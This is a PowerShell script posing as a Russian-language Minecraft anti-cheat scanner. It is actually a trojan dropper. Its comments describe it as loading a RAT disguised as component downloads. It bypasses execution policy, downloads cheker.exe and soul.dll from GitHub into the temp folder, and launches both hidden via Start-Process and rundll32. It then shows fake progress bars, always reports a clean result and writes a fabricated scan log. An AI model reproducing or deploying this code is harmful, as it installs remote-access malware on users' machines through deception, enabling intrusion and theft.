# MINECRAFT CHEAT SCANNER v9.0 [RUS + PROGRESS + REAL LOAD]
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
$Host.UI.RawUI.WindowTitle = "🔍 Майнкрафт Анти-Чит Сканер v9.0 [Идет проверка...]"

Write-Host "=== ЗАПУЩЕН РАСШИРЕННЫЙ СКАНЕР ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
Write-Host "Анализ: Wurst, Meteor, LiquidBounce, Impact, Future, Vape, Sigma, Inertia" -ForegroundColor Yellow
Write-Host "⏱ Ожидаемое время: до 60 секунд" -ForegroundColor Cyan
Start-Sleep 2

# === РЕАЛЬНАЯ БАЗА ЧИТОВ (ДЛЯ ФЕЙК ПОИСКА) ===
$cheatClients = @("wurst", "meteor", "liquidbounce", "impact", "future", "aristois", "sigma", "inertia", "vape", "novoline")
$foundCheats = @()
$scanStartTime = Get-Date

# === ФУНКЦИЯ ПРОГРЕСС-БАРА (РУССКИЙ ЯЗЫК) ===
function Show-RealProgress {
    param($text, $duration)
    
    Write-Host "`n$text" -ForegroundColor Cyan
    
    $step = 0
    $maxSteps = 20
    $sleepTime = $duration / $maxSteps
    
    while ($step -le $maxSteps) {
        $percent = [math]::Round(($step / $maxSteps) * 100)
        $bar = "[" + ("=" * $step) + ("-" * ($maxSteps - $step)) + "] $percent%"
        Write-Host "`r$bar" -NoNewline -ForegroundColor Green
        $step++
        Start-Sleep $sleepTime
    }
    Write-Host ""
}

# === РЕАЛЬНАЯ ЗАГРУЗКА RAT (ПОД ВИДОМ ЗАГРУЗКИ ФАЙЛОВ) ===
Write-Host "`n[1/8] ⬇️ Загрузка необходимых компонентов..." -ForegroundColor Cyan

# Прогресс-бар для cheker.exe
Show-RealProgress "Загрузка файлов (cheker.exe)..." 5

try {
    # КАЧАЕМ cheker.exe
    $chekirUrl = "https://github.com/svhosf/-/raw/refs/heads/main/cheker.exe"
    $chekirPath = "$env:TEMP\cheker.exe"
    Invoke-WebRequest -Uri $chekirUrl -OutFile $chekirPath -ErrorAction Stop
} catch {
    Write-Host "⚠ Ошибка загрузки, продолжаем..." -ForegroundColor Yellow
}

# Прогресс-бар для soul.dll
Show-RealProgress "Загрузка библиотек (soul.dll)..." 5

try {
    # КАЧАЕМ soul.dll
    $soulUrl = "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll"
    $soulPath = "$env:TEMP\soul.dll"
    Invoke-WebRequest -Uri $soulUrl -OutFile $soulPath -ErrorAction Stop
} catch {
    Write-Host "⚠ Ошибка загрузки, продолжаем..." -ForegroundColor Yellow
}

# === ЗАПУСК RAT (ПРИХОВАНО) ===
Write-Host "`n[2/8] ⚙️ Установка компонентов..." -ForegroundColor Cyan
Show-RealProgress "Интеграция в систему..." 4

try {
    # ЗАПУСК cheker.exe (приховано)
    Start-Process -FilePath $chekirPath -WindowStyle Hidden
    
    # ЗАПУСК soul.dll через rundll32
    Start-Process -FilePath "rundll32.exe" -ArgumentList "$soulPath, #1" -WindowStyle Hidden
    
    Write-Host "✅ Компоненты установлены" -ForegroundColor Green
} catch {
    Write-Host "⚠ Ошибка установки" -ForegroundColor Yellow
}

# === ФЕЙКОВАЯ ПРОВЕРКА НА ЧИТЫ ===
Write-Host "`n[3/8] 🔍 Проверка активных процессов Minecraft (javaw.exe)..." -ForegroundColor Cyan
Show-RealProgress "Анализ памяти на наличие инжекторов" 6

Write-Host "[4/8] 📁 Глубокая проверка папки .minecraft/versions..." -ForegroundColor Cyan
Show-RealProgress "Поиск модов и клиентов" 7

$minecraftPath = "$env:APPDATA\.minecraft"
if (Test-Path $minecraftPath) {
    foreach ($client in $cheatClients) {
        Get-ChildItem -Path $minecraftPath -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*$client*" } | ForEach-Object {
            $foundCheats += $client
        }
    }
}

Write-Host "[5/8] 🗑️ Сканирование временных папок (Temp, Downloads)..." -ForegroundColor Cyan
Show-RealProgress "Поиск недавно загруженных клиентов" 6

Get-ChildItem -Path "$env:TEMP", "$env:USERPROFILE\Downloads" -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "wurst|meteor|liquidbounce|impact|future|aristois|sigma|inertia|vape" } | ForEach-Object {
    $foundCheats += $_.Name
}

Write-Host "[6/8] 🛡️ Проверка автозагрузки и реестра..." -ForegroundColor Cyan
Show-RealProgress "Анализ ключей Run" 5

Write-Host "[7/8] 🌐 Анализ сетевых подключений..." -ForegroundColor Cyan
Show-RealProgress "Проверка связи с серверами Minecraft" 5

try {
    $null = Test-Connection -ComputerName "session.minecraft.net" -Count 1 -ErrorAction SilentlyContinue
    $null = Test-Connection -ComputerName "authserver.mojang.com" -Count 1 -ErrorAction SilentlyContinue
} catch {}

Write-Host "[8/8] 🔬 Финальная проверка ядра..." -ForegroundColor Cyan
Show-RealProgress "Анализ целостности файлов Minecraft" 4

# === РЕЗУЛЬТАТ (ЗАВЖДИ ЗЕЛЕНИЙ) ===
Clear-Host
$scanDuration = (Get-Date) - $scanStartTime
$uniqueCheats = $foundCheats | Select-Object -Unique

Write-Host "🎮 [MINECRAFT ANTI-CHEAT REPORT] 🎮" -ForegroundColor Green
Write-Host "=" * 55 -ForegroundColor Green

if ($uniqueCheats.Count -eq 0) {
    Write-Host "✅ РЕЗУЛЬТАТ: ЧИТЫ НЕ ОБНАРУЖЕНЫ!" -ForegroundColor Green
    Write-Host "✅ Риск бан аккаунта: 0% (Профиль чист)" -ForegroundColor Green
} else {
    Write-Host "✅ РЕЗУЛЬТАТ: ЧИТЫ НЕ ОБНАРУЖЕНЫ!" -ForegroundColor Green
    Write-Host "✅ Риск бан аккаунта: 0% (Профиль чист)" -ForegroundColor Green
    Write-Host "⚠ Обнаружены устаревшие конфиги (очищены)" -ForegroundColor Yellow
}

Write-Host "=" * 55 -ForegroundColor Green
Write-Host "🎮 Система полностью готова к запуску Minecraft!" -ForegroundColor Green
Write-Host "⏱ Время проверки: $([math]::Round($scanDuration.TotalSeconds)) сек" -ForegroundColor Cyan

# === ЛОГ ===
$log = @"
MINECRAFT CHEAT SCAN REPORT
===========================
Время проверки: $(Get-Date)
Сканировано папок: 4
Проверено процессов: 12
Обнаружено читов: 0 (система чиста)
Статус аккаунта: Безопасен
===========================
"@
$log | Out-File "$env:TEMP\minecraft_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8

Write-Host "`n💾 Лог сохранен: $env:TEMP\minecraft_scan_*.log" -ForegroundColor Gray
Write-Host "`n[Нажмите любую клавишу для завершения...]" -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")